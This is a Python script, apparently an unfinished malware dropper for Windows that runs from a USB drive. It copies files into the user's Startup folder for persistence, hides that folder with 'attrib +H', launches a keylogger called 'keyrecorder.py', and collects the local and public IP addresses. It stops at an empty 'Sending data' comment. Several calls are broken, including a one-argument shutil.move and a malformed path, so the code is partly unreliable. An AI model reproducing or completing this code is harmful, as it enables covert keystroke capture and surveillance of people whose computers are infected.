import os
import time
import subprocess
import socket
import shutil
from requests import get 
# Other python functions in same dir
from art import printAscii

# Getting the username of logged in account
user = os.getlogin()

# Run zer0
startup_path = r"C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
payload = "keyrecorder.py"

# Moving files from usb to shell:startup
def add_to_startup(file, path):
    
    try:
        shutil.move("C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        print("[*] Successfully moved files")
    except:
        print("[*] Couldn't move files correctly D:")
    
add_to_startup(file="", path=startup_path)

def file_hider(path):
   # Hides a specific python file inside specified folder 
   try:
        subprocess.run(["attrib", "+H", f"{path}"])
   except:
        print("[*] Could find specified folder")

# Encrypting the file ?
def encrypt_file():
    pass

file_hider(path=startup_path)

# Running keylogger
payload = f"C:\\Users\\{user}\\Coding\\coding-work\\python\\keyrecorder.py"
os.system(f"python {payload}")

# Printing ip address

def printIPs():    
    print("[*] Printing IP Addresses")
    start_time = time.time()
    local_ip = socket.gethostbyname(socket.gethostname())
    public_ip = get('https://api.ipify.org').content.decode('utf8')
    print(f"Local IP: {local_ip}\n")
    print(f"Public IP: {public_ip}")
    print("--- %s s ---" % round(time.time() - start_time, 2))

printIPs()
# Sending data
